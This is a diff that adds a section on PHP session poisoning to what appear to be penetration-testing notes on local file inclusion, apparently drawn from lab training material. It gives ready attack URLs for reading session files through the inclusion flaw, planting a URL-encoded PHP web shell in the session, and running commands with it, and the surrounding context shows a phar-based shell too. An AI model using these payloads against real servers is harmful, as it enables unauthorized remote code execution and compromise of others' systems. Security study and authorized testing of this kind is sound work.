@@ -306,4 +306,32 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 
 http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 
+# PHP Session Poisoning
 
+# Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies.
+# These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows.
+# The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix.
+# For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.
+# The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison.
+# So, let's first check if we have a PHPSESSID cookie set to our session:
+# As we can see, our PHPSESSID cookie value is nhhv8i0o6ua4g88bkdl9u1fdsd, so it should be stored at /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd.
+# Let's try include this session file through the LFI vulnerability and view its contents:
+
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+
+# Let's try setting the value of page a custom value (e.g. language parameter) and see if it changes in the session file.
+# We can do so by simply visiting the page with ?language=session_poisoning specified, as follows:
+
+http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
+
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+
+# This time, the session file contains session_poisoning instead of es.php, which confirms our ability to control the value of page in the session file.
+# Our next step is to perform the poisoning step by writing PHP code to the session file.
+# We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows:
+
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+
+# Server Log Poisoning
